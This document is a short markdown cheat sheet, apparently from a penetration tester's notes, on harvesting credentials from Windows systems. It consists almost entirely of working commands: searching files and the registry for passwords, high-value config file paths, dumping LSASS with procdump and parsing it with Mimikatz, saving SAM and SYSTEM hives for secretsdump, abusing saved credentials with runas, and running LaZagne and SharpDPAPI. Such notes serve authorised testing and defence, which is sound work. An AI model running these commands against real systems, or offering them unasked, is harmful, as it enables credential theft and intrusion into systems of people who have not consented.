---
tags: [basics, technique, windows, password]
---


> [!info] See also: [[Password Attacks]]

## Filesystem Search

```cmd
# Search all text-like files for "password" keyword
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml

# Search for common credential file names
dir /s /b *pass* *cred* *secret* *vnc* *.config 2>NUL

# Search registry for passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

```powershell
# Recursive search for password strings
Select-String -Path C:\Users\* -Pattern "password" -Include *.txt,*.xml,*.ini,*.config -Recurse

# Search for files with "pass" in the name
Get-ChildItem -Recurse -Path C:\Users -Include *pass*,*cred* -File -ErrorAction SilentlyContinue
```

## Common High-Value Locations

```
C:\Unattend.xml                         # Windows setup answer file
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\system32\sysprep\sysprep.xml
C:\inetpub\wwwroot\web.config           # IIS application config
%APPDATA%\filezilla\sitemanager.xml     # FTP client saved credentials
%APPDATA%\FileZilla\recentservers.xml
C:\ProgramData\McAfee\Common Framework\SiteList.xml  # McAfee ePO
```

## LSASS / In-Memory Credentials

```cmd
# Dump LSASS with task manager (GUI) or:
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse with Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Mimikatz direct (requires SYSTEM or SeDebugPrivilege)
privilege::debug
sekurlsa::logonpasswords
```

## SAM / Registry Hive Dump

```cmd
# Dump SAM hashes from registry (offline)
reg save HKLM\SAM C:\sam.bak
reg save HKLM\SYSTEM C:\system.bak

# Parse with secretsdump (on attacker)
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

## Credential Manager

```cmd
cmdkey /list                            # list stored credentials
# Use with runas to log in as that user:
runas /savecred /user:DOMAIN\user cmd.exe
```

## Automated Tools

```cmd
.\lazagne.exe all                       # searches browsers, apps, system
.\SharpDPAPI.exe credentials            # DPAPI credential decryption
```


